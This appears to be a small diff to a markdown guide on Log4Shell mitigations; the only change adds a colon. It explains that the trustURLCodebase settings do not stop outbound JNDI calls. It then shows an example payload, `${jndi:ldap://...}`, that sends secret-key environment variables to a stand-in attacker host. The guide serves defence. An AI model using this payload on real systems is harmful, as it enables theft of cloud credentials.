@@ -46,7 +46,7 @@ First of all, the are some simple mitigations which can stop some of the damage 
 com.sun.jndi.ldap.object.trustURLCodebase
 com.sun.jdni.rmi.object.trustURLCodebase
 ```
-This however won't stop your application from actually making the call. It only stops the contents of that call from doing anything. This still enables hackers to make your application leak it's environment variables, like in the code below
+This however won't stop your application from actually making the call. It only stops the contents of that call from doing anything. This still enables hackers to make your application leak it's environment variables, like in the code below:
 ```java
 ${jndi:ldap://malicious_atacker:123/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
 ```
